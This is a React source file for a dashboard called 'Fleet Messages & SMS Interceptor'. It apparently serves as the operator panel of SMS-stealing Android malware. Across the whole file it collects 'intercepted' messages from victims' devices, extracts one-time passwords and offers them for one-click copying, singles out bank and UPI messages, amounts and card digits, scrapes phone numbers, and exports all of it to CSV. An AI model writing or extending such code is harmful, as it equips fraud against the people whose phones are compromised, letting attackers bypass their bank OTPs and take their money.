import { useEffect, useState, useMemo, useRef } from "react";
import { Layout } from "@/components/layout";
import { useToast } from "@/hooks/use-toast";
import {
  MessageSquare,
  Search,
  Copy,
  ChevronDown,
  ChevronUp,
  IndianRupee,
  ArrowDownWideNarrow,
  Smartphone,
  ShieldCheck,
  Phone,
  KeyRound,
  Filter,
  CheckCircle2,
  ExternalLink,
  Download,
  Send,
  X,
} from "lucide-react";
import {
  classifySms,
  extractInfo,
  CATEGORY_META,
  formatSmsDate,
  type SmsCategory,
  type SmsInfo,
} from "@/lib/smsClassifier";
import { getSms, type SmsRow } from "@/lib/api";
import { usePolling } from "@/lib/usePolling";
import { Link } from "wouter";

interface SmsEntry {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  pushKey: string;
  from: string;
  body: string;
  date: number;
  category: SmsCategory;
  isFinance: boolean;
  amount: string | null;
  otpCode: string | null;
  info: SmsInfo;
  dbLabel: string;
  numbers: string[];
}

const ALL_CATS: SmsCategory[] = [
  "BANK",
  "UPI",
  "SHOPPING",
  "OTP",
  "TRAVEL",
  "INVESTMENT",
  "OFFERS",
  "ALERTS",
  "OTHER",
];

type SortMode = "newest" | "oldest" | "sender" | "device";

// Extract standalone OTP code if message contains OTP keywords
function extractOtp(body: string): string | null {
  const isOtpMsg =
    /otp|code|verification|one time|v-code|pin\b|passcode|secret/i.test(body);
  if (!isOtpMsg) return null;

  // Patterns like "OTP is 123456", "code: 1234", "123456 is your secret OTP"
  const m1 = body.match(
    /(?:otp|code|pin|passcode|verification\s*code)[^\d\n\r]{1,15}(\d{4,8})\b/i
  );
  if (m1) return m1[1];

  const m2 = body.match(/\b(\d{4,8})\s+is\s+(?:your\s+)?(?:otp|code|pin)/i);
  if (m2) return m2[1];

  // Fallback: any standalone 4-8 digit number in OTP message
  const m3 = body.match(/\b\d{4,8}\b/);
  return m3 ? m3[0] : null;
}

// Highlight matched amount and numbers
function highlightBody(body: string) {
  const esc = body
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
  return esc.replace(
    /(?:rs\.?|inr|₹)\s?([\d,]+(?:\.\d{1,2})?)|([\d,]+(?:\.\d{1,2})?)\s?(?:rs\.?|inr|₹)/gi,
    '<mark class="bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 font-bold rounded px-1">$&</mark>'
  );
}

export function AllSms() {
  const { toast } = useToast();
  const [allSms, setAllSms] = useState<SmsEntry[]>([]);
  const [catFilter, setCatFilter] = useState<SmsCategory | "all" | "finance-only" | "otp-only">("all");
  const [selectedDevice, setSelectedDevice] = useState<string>("all");
  const [sortMode, setSortMode] = useState<SortMode>("newest");
  const [search, setSearch] = useState("");
  const [expandedKeys, setExpandedKeys] = useState<Set<string>>(new Set());
  const [currentPage, setCurrentPage] = useState(1);
  const ITEMS_PER_PAGE = 40;
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // Check URL query parameters for ?device=...
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const devParam = params.get("device");
    if (devParam) {
      setSelectedDevice(devParam);
    }
  }, []);

  function scrapeNumbers(body: string, phone: string): string[] {
    const out = new Set<string>();
    for (const m of body.match(/\b[6-9]\d{9}\b/g) || []) out.add(m);
    const norm = phone.replace(/[^\d]/g, "").slice(-10);
    if (/^[6-9]\d{9}$/.test(norm)) out.add(norm);
    return [...out];
  }

  // Aggregated SMS served across all instances
  const { data: smsData, loading } = usePolling(getSms, 4000);

  useEffect(() => {
    if (!smsData?.sms) return;
    const entries: SmsEntry[] = smsData.sms.map((sms: SmsRow) => {
      const cls = classifySms(sms.body);
      return {
        deviceId: sms.deviceId,
        deviceModel: sms.deviceModel || "Unknown",
        devicePhone: sms.devicePhone || "",
        pushKey: sms.pushKey,
        from: sms.from || "UNKNOWN",
        body: sms.body || "",
        date: sms.date || Date.now(),
        category: cls.category,
        isFinance: cls.isFinance,
        amount: cls.amount,
        otpCode: extractOtp(sms.body || ""),
        info: extractInfo(sms.body || ""),
        dbLabel: sms.dbLabel || "main",
        numbers: scrapeNumbers(sms.body || "", sms.devicePhone || ""),
      };
    });
    entries.sort((a, b) => b.date - a.date);
    setAllSms(entries);
  }, [smsData]);

  // Unique devices for the filter dropdown
  const uniqueDevices = useMemo(() => {
    const map = new Map<string, { id: string; label: string; count: number }>();
    for (const s of allSms) {
      const existing = map.get(s.deviceId);
      if (existing) {
        existing.count++;
      } else {
        map.set(s.deviceId, {
          id: s.deviceId,
          label: `${s.deviceModel} (${s.devicePhone || s.deviceId.slice(0, 6)})`,
          count: 1,
        });
      }
    }
    return Array.from(map.values()).sort((a, b) => b.count - a.count);
  }, [allSms]);

  const catCounts = useMemo(() => {
    const counts: Record<string, number> = {
      all: allSms.length,
      finance: allSms.filter((s) => s.isFinance).length,
      otp: allSms.filter((s) => Boolean(s.otpCode) || s.category === "OTP").length,
    };
    for (const c of ALL_CATS) counts[c] = 0;
    for (const s of allSms) counts[s.category] = (counts[s.category] || 0) + 1;
    return counts;
  }, [allSms]);

  // Filtered & sorted message list
  const displayed = useMemo(() => {
    let list = allSms;

    // Device filter
    if (selectedDevice !== "all") {
      list = list.filter((s) => s.deviceId === selectedDevice);
    }

    // Category / Quick preset filter
    if (catFilter === "finance-only") {
      list = list.filter((s) => s.isFinance || s.category === "BANK" || s.category === "UPI");
    } else if (catFilter === "otp-only") {
      list = list.filter((s) => Boolean(s.otpCode) || s.category === "OTP");
    } else if (catFilter !== "all") {
      list = list.filter((s) => s.category === catFilter);
    }

    // Search filter
    if (search) {
      const q = search.toLowerCase();
      list = list.filter(
        (s) =>
          s.body.toLowerCase().includes(q) ||
          s.from.toLowerCase().includes(q) ||
          s.deviceModel.toLowerCase().includes(q) ||
          s.devicePhone.includes(q) ||
          s.deviceId.toLowerCase().includes(q) ||
          (s.otpCode && s.otpCode.includes(q))
      );
    }

    // Sorting
    switch (sortMode) {
      case "newest":
        list = [...list].sort((a, b) => b.date - a.date);
        break;
      case "oldest":
        list = [...list].sort((a, b) => a.date - b.date);
        break;
      case "sender":
        list = [...list].sort((a, b) => a.from.localeCompare(b.from));
        break;
      case "device":
        list = [...list].sort((a, b) =>
          a.deviceModel.localeCompare(b.deviceModel)
        );
        break;
    }
    return list;
  }, [allSms, catFilter, selectedDevice, search, sortMode]);

  const totalPages = Math.max(1, Math.ceil(displayed.length / ITEMS_PER_PAGE));
  const paginatedDisplayed = displayed.slice(
    (currentPage - 1) * ITEMS_PER_PAGE,
    currentPage * ITEMS_PER_PAGE
  );

  useEffect(() => {
    setCurrentPage(1);
  }, [catFilter, selectedDevice, search, sortMode]);

  const toggleExpand = (key: string) => {
    setExpandedKeys((prev) => {
      const n = new Set(prev);
      n.has(key) ? n.delete(key) : n.add(key);
      return n;
    });
  };

  const copyText = (text: string, key: string, label: string = "Copied") => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    toast({ title: label, description: text.slice(0, 40) });
    setTimeout(() => setCopiedKey(null), 1600);
  };

  /* Exporters */
  const download = (filename: string, content: string, mime: string) => {
    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  };

  const exportSmsCsv = () => {
    const esc = (v: any) => `"${String(v ?? "").replace(/"/g, '""')}"`;
    const header = ["date", "from", "category", "amount", "otp", "device", "body"];
    const rows = displayed.map((s) =>
      [
        new Date(s.date).toISOString(),
        s.from,
        s.category,
        s.amount ?? "",
        s.otpCode ?? "",
        s.deviceModel,
        s.body,
      ]
        .map(esc)
        .join(",")
    );
    download(
      `sms-${catFilter}.csv`,
      [header.join(","), ...rows].join("\n"),
      "text/csv;charset=utf-8"
    );
  };

  return (
    <Layout>
      {/* ── Header ── */}
      <div className="space-y-4 mb-5">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-2 border-b border-card-border">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className="p-1.5 rounded-lg bg-primary/10 text-primary">
                <MessageSquare className="w-5 h-5" />
              </span>
              <h1 className="text-xl sm:text-2xl font-bold font-display tracking-tight text-foreground">
                Fleet Messages & SMS Interceptor
              </h1>
            </div>
            <p className="text-xs sm:text-sm text-muted-foreground flex items-center gap-2 flex-wrap">
              <span>{allSms.length} messages intercepted</span>
              <span>·</span>
              <span className="text-emerald-500 font-medium">₹ {catCounts.finance} financial</span>
              <span>·</span>
              <span className="text-primary font-medium">⚡ {catCounts.otp} OTP codes</span>
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={exportSmsCsv}
              className="inline-flex items-center gap-1.5 px-3 h-9 rounded-xl border border-card-border bg-card text-xs font-semibold text-muted-foreground hover:text-foreground hover:border-primary transition-all"
            >
              <Download className="w-3.5 h-3.5" /> Export CSV
            </button>
          </div>
        </div>

        {/* ── Filters & Controls Bar ── */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
          {/* Search input */}
          <div className="relative">
            <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <input
              type="text"
              placeholder="Search SMS, sender, code, amount..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="w-full bg-card border border-card-border rounded-xl pl-10 pr-8 py-2 text-xs sm:text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
            />
            {search && (
              <button
                onClick={() => setSearch("")}
                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground p-1"
              >
                <X className="w-3.5 h-3.5" />
              </button>
            )}
          </div>

          {/* Device Selector */}
          <div className="relative">
            <Smartphone className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <select
              value={selectedDevice}
              onChange={(e) => setSelectedDevice(e.target.value)}
              className="w-full bg-card border border-card-border rounded-xl pl-10 pr-8 py-2 text-xs sm:text-sm font-medium appearance-none focus:outline-none focus:ring-2 focus:ring-primary/40 text-foreground"
            >
              <option value="all">All Devices ({uniqueDevices.length})</option>
              {uniqueDevices.map((d) => (
                <option key={d.id} value={d.id}>
                  {d.label} — {d.count} SMS
                </option>
              ))}
            </select>
            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
          </div>

          {/* Sort selector */}
          <div className="relative sm:col-span-2 lg:col-span-1">
            <ArrowDownWideNarrow className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <select
              value={sortMode}
              onChange={(e) => setSortMode(e.target.value as SortMode)}
              className="w-full bg-card border border-card-border rounded-xl pl-10 pr-8 py-2 text-xs sm:text-sm font-medium appearance-none focus:outline-none focus:ring-2 focus:ring-primary/40 text-foreground"
            >
              <option value="newest">Sort: Newest First</option>
              <option value="oldest">Sort: Oldest First</option>
              <option value="sender">Sort: Sender A–Z</option>
              <option value="device">Sort: Device A–Z</option>
            </select>
            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
          </div>
        </div>

        {/* ── Category & Preset Quick Chips ── */}
        <div className="flex items-center gap-1.5 overflow-x-auto pb-1 hide-scrollbar">
          {/* Preset: All */}
          <button
            onClick={() => setCatFilter("all")}
            className={`shrink-0 px-3 py-1.5 rounded-xl text-xs font-semibold border transition-all ${
              catFilter === "all"
                ? "bg-primary text-primary-foreground border-primary"
                : "bg-card border-card-border text-muted-foreground hover:text-foreground"
            }`}
          >
            All Messages ({catCounts.all})
          </button>

          {/* Preset: OTP Only */}
          <button
            onClick={() => setCatFilter(catFilter === "otp-only" ? "all" : "otp-only")}
            className={`shrink-0 px-3 py-1.5 rounded-xl text-xs font-semibold border transition-all flex items-center gap-1.5 ${
              catFilter === "otp-only"
                ? "bg-primary text-primary-foreground border-primary"
                : "bg-card border-card-border text-primary hover:bg-primary/5"
            }`}
          >
            <KeyRound className="w-3.5 h-3.5" />
            ⚡ OTPs & Codes ({catCounts.otp})
          </button>

          {/* Preset: Bank & Finance */}
          <button
            onClick={() => setCatFilter(catFilter === "finance-only" ? "all" : "finance-only")}
            className={`shrink-0 px-3 py-1.5 rounded-xl text-xs font-semibold border transition-all flex items-center gap-1.5 ${
              catFilter === "finance-only"
                ? "bg-emerald-600 text-white border-emerald-600"
                : "bg-card border-card-border text-emerald-600 dark:text-emerald-400 hover:bg-emerald-500/10"
            }`}
          >
            <IndianRupee className="w-3 h-3" />
            🏦 Bank & Finance ({catCounts.finance})
          </button>

          {/* Individual Categories */}
          {ALL_CATS.map((c) => (
            <button
              key={c}
              onClick={() => setCatFilter(catFilter === c ? "all" : c)}
              className={`shrink-0 px-3 py-1.5 rounded-xl text-xs font-medium border transition-all flex items-center gap-1.5 ${
                catFilter === c
                  ? "bg-primary text-primary-foreground border-primary"
                  : "bg-card border-card-border text-muted-foreground hover:text-foreground"
              }`}
            >
              <span>{CATEGORY_META[c].emoji}</span>
              <span>{CATEGORY_META[c].label}</span>
              <span className="text-[10px] opacity-70">({catCounts[c] || 0})</span>
            </button>
          ))}
        </div>
      </div>

      {/* ── Message List ── */}
      {loading ? (
        <div className="space-y-3">
          {[1, 2, 3, 4].map((i) => (
            <div key={i} className="rounded-2xl border border-card-border bg-card p-4 h-28 animate-pulse" />
          ))}
        </div>
      ) : paginatedDisplayed.length === 0 ? (
        <div className="glass-card p-12 text-center text-muted-foreground max-w-md mx-auto rounded-2xl">
          <MessageSquare className="w-12 h-12 mx-auto mb-3 opacity-30 text-primary" />
          <h3 className="font-bold text-base text-foreground mb-1">No Matching Messages</h3>
          <p className="text-xs text-muted-foreground">
            No SMS messages match your current filter or search criteria.
          </p>
        </div>
      ) : (
        <div className="space-y-3">
          {paginatedDisplayed.map((sms) => {
            const key = `${sms.deviceId}:${sms.pushKey}`;
            const expanded = expandedKeys.has(key);
            const needsExpand = sms.body.length > 180;
            const preview = sms.body.slice(0, 180) + "…";
            const meta = CATEGORY_META[sms.category];

            return (
              <div
                key={key}
                className="rounded-2xl border border-card-border bg-card p-4 sm:p-5 transition-all hover:border-primary/40 shadow-xs"
              >
                {/* Top Row: Sender + Category + Date */}
                <div className="flex items-center justify-between gap-2 mb-2">
                  <div className="flex items-center gap-2 flex-wrap min-w-0">
                    <span className="font-bold text-sm text-foreground truncate select-all">
                      {sms.from}
                    </span>
                    <span
                      className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-md text-[10px] font-bold uppercase tracking-wide ${
                        sms.isFinance
                          ? "bg-emerald-500/15 text-emerald-600 dark:text-emerald-400"
                          : "bg-muted text-muted-foreground"
                      }`}
                    >
                      {meta.emoji} {meta.label}
                    </span>
                    {sms.amount && (
                      <span className="inline-flex items-center gap-0.5 px-2 py-0.5 rounded-md bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 text-xs font-bold font-mono">
                        <IndianRupee className="w-3 h-3" /> {sms.amount}
                      </span>
                    )}
                  </div>
                  <span className="text-[11px] font-mono text-muted-foreground shrink-0">
                    {formatSmsDate(sms.date)}
                  </span>
                </div>

                {/* OTP Quick-Action Banner (If detected) */}
                {sms.otpCode && (
                  <div className="mb-3 p-2.5 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-between gap-2">
                    <div className="flex items-center gap-2 min-w-0">
                      <span className="p-1 rounded bg-primary text-primary-foreground">
                        <KeyRound className="w-3.5 h-3.5" />
                      </span>
                      <div className="min-w-0">
                        <span className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider block">
                          One-Time Password
                        </span>
                        <span className="font-mono text-base font-black text-primary tracking-widest">
                          {sms.otpCode}
                        </span>
                      </div>
                    </div>
                    <button
                      onClick={() => copyText(sms.otpCode!, key + "-otp", "OTP Copied")}
                      className="px-3 h-8 rounded-lg bg-primary text-primary-foreground text-xs font-bold hover:bg-primary/90 transition-all shrink-0 flex items-center gap-1"
                    >
                      {copiedKey === key + "-otp" ? (
                        <>
                          <CheckCircle2 className="w-3.5 h-3.5" /> Copied
                        </>
                      ) : (
                        <>
                          <Copy className="w-3.5 h-3.5" /> Copy Code
                        </>
                      )}
                    </button>
                  </div>
                )}

                {/* Message Body */}
                <div className="text-xs sm:text-sm text-foreground/90 leading-relaxed break-words font-normal mb-3">
                  {expanded || !needsExpand ? (
                    <span
                      dangerouslySetInnerHTML={{
                        __html: highlightBody(sms.body),
                      }}
                    />
                  ) : (
                    <span>{preview}</span>
                  )}
                  {needsExpand && (
                    <button
                      onClick={() => toggleExpand(key)}
                      className="ml-1 text-primary font-semibold hover:underline inline-flex items-center text-xs"
                    >
                      {expanded ? "Show Less" : "Read More"}
                    </button>
                  )}
                </div>

                {/* Bottom Footer: Device info, Bank pill, Actions */}
                <div className="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-card-border/60 text-xs">
                  <div className="flex items-center gap-2 flex-wrap text-muted-foreground text-[11px]">
                    <Link
                      href={`/device/${sms.deviceId}`}
                      className="inline-flex items-center gap-1 font-medium hover:text-primary transition-colors"
                    >
                      <Smartphone className="w-3 h-3" />
                      {sms.deviceModel} ({sms.devicePhone || sms.deviceId.slice(0, 6)})
                    </Link>
                    {sms.info.bank && (
                      <span className="px-1.5 py-0.5 rounded bg-muted text-[10px] font-semibold">
                        🏦 {sms.info.bank}
                      </span>
                    )}
                    {sms.info.cardLast4 && (
                      <span className="font-mono text-[10px]">
                        💳 •••• {sms.info.cardLast4}
                      </span>
                    )}
                  </div>

                  <div className="flex items-center gap-1.5">
                    <button
                      onClick={() => copyText(sms.body, key + "-body", "SMS Text Copied")}
                      className="px-2.5 py-1 rounded-lg border border-card-border hover:bg-muted text-[11px] font-semibold text-muted-foreground hover:text-foreground transition-all flex items-center gap-1"
                    >
                      {copiedKey === key + "-body" ? (
                        <>
                          <CheckCircle2 className="w-3 h-3 text-emerald-500" /> Copied
                        </>
                      ) : (
                        <>
                          <Copy className="w-3 h-3" /> Copy SMS
                        </>
                      )}
                    </button>
                    <Link
                      href={`/device/${sms.deviceId}`}
                      className="p-1 rounded-lg hover:bg-muted text-muted-foreground hover:text-primary"
                      title="Open device"
                    >
                      <ExternalLink className="w-3.5 h-3.5" />
                    </Link>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* ── Pagination ── */}
      {totalPages > 1 && (
        <div className="flex items-center justify-center gap-2 mt-6">
          <button
            disabled={currentPage <= 1}
            onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
            className="px-3 py-1.5 rounded-xl border border-card-border bg-card text-xs font-semibold disabled:opacity-40"
          >
            Previous
          </button>
          <span className="text-xs text-muted-foreground font-mono px-2">
            Page {currentPage} of {totalPages}
          </span>
          <button
            disabled={currentPage >= totalPages}
            onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
            className="px-3 py-1.5 rounded-xl border border-card-border bg-card text-xs font-semibold disabled:opacity-40"
          >
            Next
          </button>
        </div>
      )}
    </Layout>
  );
}
